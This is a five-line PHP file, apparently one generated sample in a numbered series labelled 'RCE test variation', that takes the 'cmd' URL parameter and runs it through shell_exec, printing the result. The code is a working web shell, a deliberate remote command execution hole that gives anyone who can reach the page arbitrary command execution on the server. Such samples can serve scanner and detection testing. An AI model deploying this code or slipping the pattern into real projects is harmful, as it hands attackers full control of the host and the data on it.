<?php
// RCE test variation #1408
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>